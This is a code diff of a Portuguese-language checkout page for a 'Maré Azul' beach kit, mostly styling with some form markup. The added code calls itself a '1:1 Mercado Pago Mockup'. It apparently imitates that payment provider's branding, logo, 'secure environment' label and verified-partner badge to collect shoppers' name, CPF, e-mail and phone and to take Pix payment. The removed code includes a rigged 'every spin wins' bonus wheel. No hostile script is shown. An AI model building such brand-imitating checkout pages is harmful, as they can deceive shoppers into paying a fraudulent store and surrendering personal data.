+  color: #475569;
+}
+.pm-icon-wrap.wallet {
+  background: #edf3f8;
+  color: #475569;
+}
+.pm-texts h3 {
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 2px;
+}
+.pm-texts p {
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
+  margin: 0;
+}
+.pm-chevron {
+  color: #009ee3;
+}
+
+/* Botões Azuis: Grandes, Chamativos e Confortáveis */
+.btn-primary {
+  width: 100%;
+  height: 54px;
+  background: #009ee3;
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: 0.2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 20px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
+  transition: background 0.15s, transform 0.05s;
+}
+.btn-primary:hover {
+  background: #0084c2;
+}
+.btn-primary:active {
+  transform: scale(0.99);
+}
+.security-note {
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  gap: 9px;
+  margin-top: 14px;
+}
+.security-lock-icon {
+  width: 18px;
+  height: 18px;
+  min-width: 18px;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+.security-text-col {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  text-align: left;
+  line-height: 1.35;
+}
+.security-text-main {
+  color: #596579;
+  font-size: 13.5px;
+  font-weight: 400;
+  line-height: 1.35;
+}
+.security-link {
+  color: #009ee3;
+  font-size: 13.5px;
+  font-weight: 500;
+  text-decoration: none;
+  line-height: 1.35;
+  transition: color 0.15s ease, text-decoration 0.15s ease;
+}
+.security-link:hover {
+  text-decoration: underline;
+  color: #0084c2;
+}
+
+
+/* --- Pagamento Pix 1:1 Mercado Pago Mockup --- */
+.pix-headline {
+  margin-top: 4px;
+  margin-bottom: 14px;
+  text-align: left;
+}
+.pix-headline-title {
+  font-size: 23px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 5px;
+  line-height: 1.2;
+}
+.pix-headline-sub {
+  font-size: 13.5px;
+  font-weight: 400;
+  color: #64748b;
+  line-height: 1.4;
+  margin: 0;
+}
+
+/* Valor do pedido Banner */
+.order-value-banner {
+  background: #edf5ff;
+  border-radius: 16px;
+  padding: 16px 20px;
+  text-align: center;
+  margin-bottom: 16px;
+}
+.order-value-title {
+  display: block;
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 4px;
+}
+.order-value-number {
+  display: block;
+  font-size: 29px;
+  font-weight: 800;
+  color: #0f172a;
+  line-height: 1.15;
+}
+
+/* QR Code Card - Compacto e Elegante */
+.pix-qr-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 18px;
+  padding: 22px 18px 22px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+  text-align: center;
+  margin-bottom: 16px;
+}
+
+/* Área do QR Code mais compacta para dar foco ao Copia e Cola */
+.qr-wrapper {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 16px;
+  padding: 10px;
+  background: #ffffff;
+  border: 1px solid #e2e8f0;
+  border-radius: 12px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+}
+.qr-code canvas, .qr-code svg, .qr-code img {
+  width: 145px !important;
+  height: 145px !important;
+  display: block;
+  border-radius: 4px;
+}
+.qr-helper-text {
+  font-size: 12.5px;
+  color: #64748b;
+  margin-bottom: 16px;
+  line-height: 1.3;
+}
+
+/* =========================================
+   BLOCO PIX COPIA E COLA (SUPER DESTACADO)
+   ========================================= */
+.pix-copia-cola-section {
+  background: #f0f7ff;
+  border: 2px solid #009ee3;
+  border-radius: 14px;
+  padding: 16px 14px;
+  margin-top: 6px;
+  box-shadow: 0 3px 12px rgba(0, 158, 227, 0.12);
+  text-align: left;
+}
+.copia-cola-badge-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+}
+.copia-cola-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  background: #009ee3;
+  color: #ffffff;
+  font-size: 11.5px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  padding: 4px 9px;
+  border-radius: 6px;
+}
+.copia-cola-badge svg {
+  width: 13px;
+  height: 13px;
+}
+.copia-cola-sub {
+  font-size: 12px;
+  font-weight: 600;
+  color: #0284c7;
+}
+
+/* Botão Principal Gigante de Copiar Pix */
+.btn-copy-pix-main {
+  width: 100%;
+  height: 56px;
+  background: linear-gradient(180deg, #00a8f3 0%, #009ee3 100%);
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17.5px;
+  font-weight: 800;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-top: 10px;
+  margin-bottom: 10px;
+  box-shadow: 0 5px 18px rgba(0, 158, 227, 0.4);
+  cursor: pointer;
+  transition: all 0.2s ease;
+  border: none;
+  font-family: inherit;
+  letter-spacing: -0.2px;
+}
+.btn-copy-pix-main:hover {
+  background: #0084c2;
+  box-shadow: 0 6px 22px rgba(0, 158, 227, 0.5);
+  transform: translateY(-1px);
+}
+.btn-copy-pix-main:active {
+  transform: scale(0.98);
+}
+.btn-copy-pix-main.copied {
+  background: #00a650 !important;
+  box-shadow: 0 5px 18px rgba(0, 166, 80, 0.45) !important;
+}
+.copy-main-icon {
+  width: 24px;
+  height: 24px;
+  stroke: #ffffff;
+  flex-shrink: 0;
+}
+
+/* Caixa com o código clicável */
+.pix-code-container {
+  background: #ffffff;
+  border: 1.5px dashed #93c5fd;
+  border-radius: 10px;
+  padding: 10px 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 10px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+.pix-code-container:hover {
+  border-color: #009ee3;
+  background: #f8fafc;
+}
+.pix-copy-code-text {
+  font-size: 12px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  line-height: 1.4;
+  color: #334155;
+  word-break: break-all;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+  margin: 0;
+}
+.pix-code-copy-mini-hint {
+  font-size: 11.5px;
+  font-weight: 700;
+  color: #009ee3;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+
+/* Aguardando pagamento Notice */
+.waiting-payment-box {
+  background: #edf5ff;
+  border-radius: 14px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 16px;
+  text-align: left;
+}
+.waiting-icon {
+  width: 28px;
+  height: 28px;
+  min-width: 28px;
+  stroke: #009ee3;
+  flex-shrink: 0;
+}
+.waiting-content {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.waiting-title {
+  font-size: 14.5px;
+  font-weight: 700;
+  color: #0284c7;
+  line-height: 1.25;
+}
+.waiting-desc {
+  font-size: 12.5px;
+  color: #64748b;
+  line-height: 1.35;
+  margin: 0;
+}
+
+/* Como pagar com Pix? Card */
+.how-to-pix-card {
+  background: #ffffff;
+  border: 1px solid #eef2f6;
+  border-radius: 16px;
+  padding: 18px 16px 14px;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
+  margin-bottom: 24px;
+  text-align: left;
+}
+.how-to-pix-title {
+  font-size: 15.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 12px;
+}
+.how-to-pix-list {
+  display: flex;
+  flex-direction: column;
+}
+.how-to-pix-item {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 11px 0;
+  border-bottom: 1px solid #f1f5f9;
+}
+.how-to-pix-item:last-child {
+  border-bottom: none;
+}
+.how-to-item-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.how-to-step-badge {
+  width: 26px;
+  height: 26px;
+  min-width: 26px;
+  border-radius: 50%;
+  background: #e0f2fe;
+  color: #0284c7;
+  font-size: 13px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.how-to-step-text {
+  font-size: 13px;
+  color: #475569;
+  line-height: 1.3;
+}
+.how-to-chevron {
+  width: 17px;
+  height: 17px;
+  stroke: #64748b;
+  flex-shrink: 0;
+}
+
+/* Step 4 Pagamento Specifics */
+.pix-pay-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 18px;
+  padding: 24px 20px 28px;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+}
+@media (min-width: 640px) {
+  .pix-pay-card {
+    background: #f8fafc;
+  }
+}
+.pix-pay-title {
+  font-size: 21px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+}
+.pix-pay-desc {
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 16px;
+}
+.qr-frame {
+  display: inline-flex;
+  padding: 14px;
+  background: #ffffff;
+  border: 2px solid #cbd5e1;
+  border-radius: 18px;
+  margin-bottom: 18px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+}
+.qr-frame canvas, .qr-frame svg, .qr-frame img {
+  width: 190px;
+  height: 190px;
+  display: block;
+}
+
+.copy-input-block {
+  text-align: left;
+  margin-bottom: 14px;
+}
+.copy-label {
+  display: block;
+  font-size: 14px;
+  font-weight: 700;
+  color: #1e293b;
+  margin-bottom: 6px;
+}
+.copy-box {
+  display: flex;
+  align-items: center;
+  background: #ffffff;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
+  overflow: hidden;
+  height: 50px;
+}
+.copy-box input {
+  flex: 1;
+  border: 0;
+  height: 100%;
+  padding: 0 14px;
+  font-size: 14px;
+  font-weight: 600;
+  color: #334155;
+  outline: none;
+  background: transparent;
+  min-width: 0;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.copy-inline-btn {
+  padding: 0 16px;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  color: #009ee3;
+  border-left: 1.5px solid #e2e8f0;
+  background: #f8fafc;
+}
+
+.btn-copy-pix {
+  width: 100%;
+  height: 52px;
+  background: #009ee3;
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-bottom: 16px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
+  transition: background 0.15s;
+}
+.btn-copy-pix svg {
+  width: 20px;
+  height: 20px;
+}
+.btn-copy-pix:hover {
+  background: #0084c2;
+}
+
+.amount-block {
+  margin-bottom: 16px;
+  text-align: center;
+}
+.amount-title {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  color: #64748b;
+  margin-bottom: 2px;
+}
+.amount-number {
+  font-size: 28px;
+  font-weight: 700;
+  color: #0f172a;
+}
+
+.instant-notice {
+  background: #eff6ff;
+  border: 1.5px solid #bfdbfe;
+  border-radius: 12px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-align: left;
+  margin-bottom: 20px;
+}
+.instant-icon {
+  color: #0284c7;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+}
+.instant-content strong {
+  display: block;
+  font-size: 14.5px;
+  font-weight: 700;
+  color: #0369a1;
+}
+.instant-content p {
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #0284c7;
+  line-height: 1.35;
+}
+
+.how-to-block {
+  text-align: center;
+}
+.how-to-title {
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 12px;
+  text-align: left;
+}
+.how-to-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+}
+.how-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+.how-badge {
+  width: 22px;
+  height: 22px;
+  border-radius: 6px;
+  background: #009ee3;
+  color: #ffffff;
+  font-size: 12px;
+  font-weight: 700;
+  display: grid;
+  place-items: center;
+  margin-bottom: 6px;
+}
+.how-icon-box {
+  width: 28px;
+  height: 28px;
+  display: grid;
+  place-items: center;
+  margin-bottom: 6px;
+}
+.how-item p {
+  font-size: 12.5px;
+  font-weight: 600;
+  color: #1e293b;
+  line-height: 1.35;
+}
+
+/* Toast Notification */
+.copy-toast {
+  position: fixed;
+  bottom: 24px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(15, 23, 42, 0.95);
+  color: #ffffff;
+  padding: 12px 24px;
+  border-radius: 24px;
+  font-size: 15px;
+  font-weight: 700;
+  z-index: 9999;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.22);
+}
 </style>
-<style>*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}:root{--primary:#F15A24;--primary-dark:#d44d1a;--bg:#f5f5f5;--white:#ffffff;--text:#1a1a1a;--text-muted:#6b7280;--border:#e5e7eb;--error:#ef4444;--radius:14px;--shadow:0 1px 3px rgba(0,0,0,0.08),0 1px 2px rgba(0,0,0,0.04)}body{background:var(--bg);color:var(--text);min-height:100vh}.header{display:flex;align-items:center}.header-logo{left:50%;display:flex;align-items:center}.header-logo img{object-fit:contain}.header-secure{display:flex;align-items:center;gap:5px;text-align:right;line-height:1.2}.header-secure svg{flex-shrink:0}.banner{text-align:center;display:flex;align-items:center;justify-content:center;gap:6px;overflow:hidden}.banner svg{flex-shrink:0}.main{margin:0 auto}.section{background:var(--white);border-radius:var(--radius);overflow:hidden}.section-header{display:flex;align-items:center;justify-content:space-between;cursor:pointer;user-select:none}.section-left{display:flex;align-items:center}.step-badge{border-radius:50%;color:#fff;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0}.step-title{color:var(--text)}.step-sub{color:var(--text-muted);margin-top:1px}.section-icon{color:var(--text-muted)}.section-icon.orange{color:var(--primary)}.chevron{transition:transform 0.25s}.chevron.open{transform:rotate(180deg)}.section-body.open{display:block}.form-group label{display:block}.form-group input{width:100%;border:1.5px solid var(--border);color:var(--text);font-family:inherit;outline:none;transition:border-color 0.2s,box-shadow 0.2s;-webkit-appearance:none}.form-group input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(241,90,36,0.1);background:#fff}.form-group input::placeholder{color:#c4c9d4;font-weight:400}.form-row{display:grid;grid-template-columns:1fr 1fr}.field-error{font-size:11px;color:var(--error);margin-top:4px;font-weight:600}@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}.product-row{display:flex;align-items:center}.product-img{object-fit:contain;border-radius:10px;flex-shrink:0}.product-name{font-weight:800}.product-price{font-weight:900;color:var(--primary)}.summary-lines{border-top:1.5px solid var(--border);padding-top:12px}.summary-line{display:flex;justify-content:space-between;font-weight:600;color:var(--text-muted)}.summary-total{display:flex;justify-content:space-between;font-weight:900;color:var(--text);border-top:1.5px solid var(--border)}.summary-total span:last-child{color:var(--primary)}.trust-grid{display:grid}.trust-item{display:flex;align-items:center;background:var(--white);border:1.5px solid var(--border);border-radius:12px;font-weight:700}.trust-icon{border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}.trust-icon svg{color:#fff}.trust-sub{font-weight:400;color:var(--text-muted)}.footer{text-align:center;color:var(--text-muted);display:flex;align-items:center;justify-content:center;gap:6px}.footer svg{width:13px;height:13px}#loading-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);flex-direction:column;align-items:center;justify-content:center;z-index:999;gap:14px}@keyframes spin{to{transform:rotate(360deg)}}#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:#1a1a1a;color:#fff;border-radius:10px;padding:12px 20px;font-size:13px;font-weight:700;z-index:1000;transition:transform 0.3s ease;pointer-events:none;white-space:nowrap;align-items:center;gap:8px}.section-locked{opacity:0.45;pointer-events:none}.section-locked .step-badge{background:#d1d5db}.btn-continuar{width:100%;background:var(--primary);border:none;color:#fff;font-family:inherit;cursor:pointer;margin-top:4px;display:flex;align-items:center;justify-content:center;gap:8px;transition:background 0.2s,transform 0.1s}.btn-continuar:hover{background:var(--primary-dark)}.btn-continuar:active{transform:scale(0.98)}.btn-continuar svg{width:16px;height:16px}:root{--primary:#ff6b00;--primary-dark:#e85d00;--bg:#f6f5f2;--border:#e8e6e1;--text:#16181d;--text-muted:#6b6f78;--radius:14px;--shadow:0 1px 2px rgba(16,18,22,.05),0 8px 24px rgba(16,18,22,.05)}body{font-family:"Inter",system-ui,sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}.header{position:sticky!important;top:0;z-index:50;background:#121316;padding:0 16px;height:58px;justify-content:space-between}.header-logo{position:static;transform:none}.header-logo img{height:32px}.header-secure{color:#d1d5db;font-size:11px;font-weight:700;letter-spacing:.02em}.header-secure svg{width:15px;height:15px;color:#4ade80}.banner{background:var(--primary);color:#fff;font-size:11.5px;font-weight:700;padding:7px 12px;white-space:normal;line-height:1.3}.banner svg{width:15px;height:15px}.steps{display:flex;justify-content:center;gap:6px;align-items:center;font-size:11px;font-weight:700;color:var(--text-muted);margin:4px 0 12px}.steps span{display:flex;align-items:center;gap:5px}.steps i{font-style:normal;width:18px;height:18px;border-radius:50%;background:#121316;color:#fff;font-size:10px;display:flex;align-items:center;justify-content:center}.steps hr{width:18px;border:0;border-top:1.5px dashed #c9c6bf}.main{max-width:520px;padding:14px 12px 40px}.section{margin-bottom:10px;border:1px solid var(--border);box-shadow:var(--shadow)}.section-header{padding:13px 14px}.section-left{gap:10px}.step-badge{width:28px;height:28px;font-size:13px;background:#121316}.step-title{font-size:15px;font-weight:800;letter-spacing:-.01em}.step-sub{font-size:11.5px}.section-icon{display:flex;align-items:center;gap:6px}.section-icon svg{width:18px;height:18px}.section-icon .chevron{margin-top:0!important}.section-body{padding:0 14px 14px}.form-group{margin-bottom:10px}.form-group label{font-size:12px;font-weight:700;margin-bottom:5px;color:#3b3f47}.form-group input{background:#fff;padding:11px 12px;font-size:15px;font-weight:500;border-radius:10px;border-width:1px}.form-group input:focus{box-shadow:0 0 0 3px rgba(255,107,0,.12)}.form-row{gap:8px}.btn-continuar{border-radius:12px;padding:13px;font-size:15px;font-weight:800;box-shadow:0 6px 18px rgba(255,107,0,.28);text-transform:none;letter-spacing:0}.product-row{gap:12px;margin-bottom:12px}.product-img{width:72px;height:72px;background:var(--bg);border:1px solid var(--border)}.product-name{font-size:14px;margin-bottom:2px}.product-price{font-size:18px}.summary-line{font-size:13px;padding:4px 0}.summary-total{font-size:17px;padding-top:10px;margin-top:6px}.trust-grid{grid-template-columns:repeat(3,1fr);gap:6px;margin-top:10px}.trust-item{flex-direction:column;text-align:center;padding:10px 6px;gap:6px;font-size:11.5px;border-width:1px}.trust-item[style]{grid-column:auto!important}.trust-icon{width:30px;height:30px;background:#121316}.trust-icon svg{width:15px;height:15px}.trust-sub{font-size:10px}.footer{padding:16px;font-size:11px}@media (min-width:900px){.header{padding:0 32px}.main{margin-top:12px}}.rl-overlay{position:fixed;inset:0;z-index:900;background:rgba(10,11,13,.82);backdrop-filter:blur(4px);align-items:center;justify-content:center;padding:16px}@keyframes rlIn{from{transform:scale(.92);opacity:0}to{transform:none;opacity:1}}@keyframes rlFall{to{transform:translateY(110vh) rotate(720deg)}}@keyframes rlPulse{0%,100%{border-color:var(--border);transform:none}40%{border-color:var(--primary);transform:translateY(-3px);box-shadow:0 6px 14px rgba(255,107,0,.25)}}@keyframes mbShake{0%,55%,100%{transform:rotate(0)}60%{transform:rotate(-5deg) translateY(-3px)}68%{transform:rotate(5deg) translateY(-3px)}76%{transform:rotate(-4deg)}84%{transform:rotate(3deg)}92%{transform:rotate(-1deg)}}@keyframes mbFloat{0%,100%{margin-top:0}50%{margin-top:-7px}}@keyframes mbPop{0%{margin-top:0}50%{margin-top:-14px}100%{margin-top:-4px}}@keyframes mbGlow{0%{box-shadow:0 0 0 0 rgba(255,200,120,.9)}100%{box-shadow:0 0 60px 70px rgba(255,200,120,0)}}html{touch-action:pan-x pan-y}
-.pix-badge-card{display:flex;align-items:center;gap:12px;background:#edfbf4;border:1.5px solid #a7f3d0;border-radius:12px;padding:12px 14px;margin-bottom:14px}
-.pix-icon-wrap{width:38px;height:38px;border-radius:50%;background:#14b8a6;display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0}
-.pix-icon-wrap svg{width:22px;height:22px}
-.pix-badge-info strong{display:block;font-size:13.5px;font-weight:800;color:#0f172a}
-.pix-badge-info span{display:block;font-size:11.5px;color:#64748b;margin-top:1px}
-.upgrade-box{border:1.5px dashed #f97316;border-radius:14px;padding:14px;background:#fff;margin-bottom:16px}
-.upgrade-title{display:flex;align-items:center;gap:6px;color:#ea580c;font-size:11.5px;font-weight:900;letter-spacing:0.3px;margin-bottom:12px;text-transform:uppercase}
-.upgrade-title svg{color:#ea580c;flex-shrink:0}
-.upgrade-option{display:flex;align-items:center;gap:12px;background:#fff;border:1.5px solid #e5e7eb;border-radius:12px;padding:12px 14px;margin-bottom:8px;cursor:pointer;transition:all .2s ease}
-.upgrade-option:hover{border-color:#fdba74}
-.upgrade-option.active{border-color:#ea580c;background:#fffaf5;box-shadow:0 2px 8px rgba(234,88,12,0.08)}
-.upgrade-option input[type="radio"]{accent-color:#ea580c;width:18px;height:18px;flex-shrink:0;cursor:pointer}
-.upgrade-option-body{display:flex;align-items:center;justify-content:space-between;width:100%}
-.upgrade-option-text strong{display:block;font-size:13.5px;font-weight:800;color:#111827}
-.upgrade-option-text span{display:block;font-size:11px;color:#6b7280;margin-top:1px}
-.upgrade-price{font-size:13.5px;font-weight:900;color:#ea580c;white-space:nowrap;margin-left:8px}
-.upgrade-price-free{color:#64748b!important;font-size:13px!important;font-weight:700!important}
-#finish{display:flex;align-items:center;justify-content:center;gap:8px;font-size:15px;font-weight:900;letter-spacing:.3px;background:linear-gradient(180deg,#ff6b00,#e85d00);box-shadow:0 6px 20px rgba(255,107,0,.35)}
-</style>
-<meta name="referrer" content="no-referrer"><style>.sf-hidden{display:none!important}</style><link rel="stylesheet" href="/assets/boxes-interactions.css"><meta name="checkout-test-mode" content="boxes-live"><script type="module" src="/assets/boxes-tiktok.js?v=2"></script></head>
+</head>
 <body>
-<div id="loading-overlay" class="sf-hidden">
+  <div hidden class="product"><img id="legacyProductImg" src="/calcas/assets/azul-escuro.png" alt=""></div>
+  <span hidden id="calcasSelection"></span>
 
+  <main class="checkout-shell">
+    <header class="mp-header">
+      <div class="mp-top-bar">
+        <img class="mp-logo-img" src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.19.5/mercadopago/logo__large.png" alt="Mercado Pago">
+        <div class="mp-secure-badge">
+          <svg class="mp-secure-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          <span class="mp-secure-text">Ambiente seguro</span>
+        </div>
+      </div>
 
-</div>
-<div id="toast" class="sf-hidden"></div>
+      <div class="store-partner-card">
+        <div class="store-avatar">M</div>
+        <div class="store-info">
+          <div class="store-title-row">
+            <span class="store-name">Maré Azul</span>
+            <svg class="store-verified-icon" viewBox="0 0 24 24" fill="none">
+              <path d="M10.586 1.707a2 2 0 0 1 2.828 0l.758.758a2 2 0 0 0 1.414.586h1.071a2 2 0 0 1 2 2v1.071a2 2 0 0 0 .586 1.414l.758.758a2 2 0 0 1 0 2.828l-.758.758a2 2 0 0 0-.586 1.414v1.071a2 2 0 0 1-2 2h-1.071a2 2 0 0 0-1.414.586l-.758.758a2 2 0 0 1-2.828 0l-.758-.758a2 2 0 0 0-1.414-.586H8.071a2 2 0 0 1-2-2v-1.071a2 2 0 0 0-.586-1.414l-.758-.758a2 2 0 0 1 0-2.828l.758-.758a2 2 0 0 0 .586-1.414V6.065a2 2 0 0 1 2-2h1.071a2 2 0 0 0 1.414-.586l.758-.758z" fill="#009ee3"/>
+              <path d="M8.5 12.2l2.3 2.3 4.7-4.7" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <p class="store-subtext">Loja parceira &middot; Pagamento via Mercado Pago</p>
+        </div>
+      </div>
+    </header>
 
-<div class="rl-overlay" id="rl-overlay">
- <div class="rl-card">
-  <div id="rl-spin-view">
-   <div class="rl-eyebrow">BÔNUS EXCLUSIVO</div>
-   <div class="rl-title">Gire a roleta e ganhe um bônus</div>
-   <div class="rl-sub">Todo giro é premiado. O bônus é aplicado automaticamente no seu pedido.</div>
-   <div class="rl-wheel-wrap">
-    <div class="rl-pointer"></div>
-    <div class="rl-wheel" id="rl-wheel" style="background:conic-gradient(rgb(255,107,0) 0deg,rgb(255,107,0) 45deg,rgb(18,19,22) 45deg,rgb(18,19,22) 90deg,rgb(255,242,232) 90deg,rgb(255,242,232) 135deg,rgb(42,45,52) 135deg,rgb(42,45,52) 180deg,rgb(255,107,0) 180deg,rgb(255,107,0) 225deg,rgb(18,19,22) 225deg,rgb(18,19,22) 270deg,rgb(255,242,232) 270deg,rgb(255,242,232) 315deg,rgb(42,45,52) 315deg,rgb(42,45,52) 360deg)">
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(-67.5deg)">Frete 24h<br>grátis</div>
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(-22.5deg)">Upgrade<br>Premium</div>
-     <div class="rl-seg" style="color:rgb(18,19,22);transform:rotate(22.5deg)">R$ 10<br>OFF</div>
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(67.5deg)">Brinde<br>extra</div>
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(112.5deg)">Frete 24h<br>grátis</div>
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(157.5deg)">Upgrade<br>Premium</div>
-     <div class="rl-seg" style="color:rgb(18,19,22);transform:rotate(202.5deg)">R$ 10<br>OFF</div>
-     <div class="rl-seg" style="color:rgb(255,255,255);transform:rotate(247.5deg)">Brinde<br>extra</div>
+    <section class="product-card">
+      <div class="product-thumb">
+        <img id="productThumbImg" src="/assets/home-1.webp" alt="Kit Dobrável Duo 3 em 1 — Maré Azul">
+      </div>
+      <div class="product-details">
+        <h2 class="product-title" id="productTitle">Kit Dobrável Duo 3 em 1</h2>
+        <p class="product-subtitle" id="productSubtitle">Cadeiras, Cooler e Guarda-Sol · Cor: <span id="selectedColorDisplay">Azul</span></p>
+        <p class="product-qty">Quantidade: 1 kit completo</p>
+      </div>
+      <strong class="product-price" id="visiblePrice">R$ 119,90</strong>
+      <span hidden class="price">R$ 119,90</span>
+    </section>
+
+    <nav aria-label="Etapas do checkout">
+      <ol class="stepper">
+        <li class="active">
+          <button data-step="0" type="button">
+            <span class="step-circle">1</span>
+            <p class="step-label">Informações</p>
+          </button>
+        </li>
+        <li>
+          <button data-step="1" type="button" disabled>
+            <span class="step-circle">2</span>
+            <p class="step-label">Entrega</p>
+          </button>
+        </li>
+        <li>
+          <button data-step="2" type="button" disabled>
+            <span class="step-circle">3</span>
+            <p class="step-label">Pagamento</p>
+          </button>
+        </li>
+      </ol>
+    </nav>
+
+    <!-- STEP 1: Seus dados -->
+    <section class="checkout-step" data-panel="0">
+      <h1 class="section-title">Seus dados</h1>
+      <p class="section-desc">Precisamos dessas informações para processar o seu envio com segurança.</p>
+
+      <div class="form-card">
+        <div class="field">
+          <label for="name">Nome completo <span class="field-check-badge" id="nameCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <input id="name" type="text" placeholder="Digite seu nome e sobrenome" required autocomplete="name">
+          <p class="field-error" id="nameError"></p>
+        </div>
+        <div class="field">
+          <label for="cpf">CPF <span class="field-check-badge" id="cpfCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <input id="cpf" type="tel" placeholder="000.000.000-00" required maxlength="14">
+          <p class="field-error" id="cpfError"></p>
+        </div>
+        <div class="field">
+          <label for="email">E-mail <span class="field-check-badge" id="emailCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <input id="email" type="email" placeholder="seu@email.com" required autocomplete="email">
+          <p class="field-error" id="emailError"></p>
+        </div>
+        <div class="field">
+          <label for="phone">Celular com WhatsApp <span class="field-check-badge" id="phoneCheck"><svg viewBox="0 0 16 16" width="14" height="14" fill="none"><circle cx="8" cy="8" r="8" fill="#009ee3"/><path d="M4.6 8.2l2.4 2.4 4.4-4.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg></span></label>
+          <input id="phone" type="tel" placeholder="(00) 00000-0000" required autocomplete="tel" maxlength="15">
+          <p class="field-error" id="phoneError"></p>
+        </div>
+      </div>
+
+      <button class="btn-primary" data-next type="button">
+        <span>Continuar para a entrega</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"></polyline>
+        </svg>
+      </button>
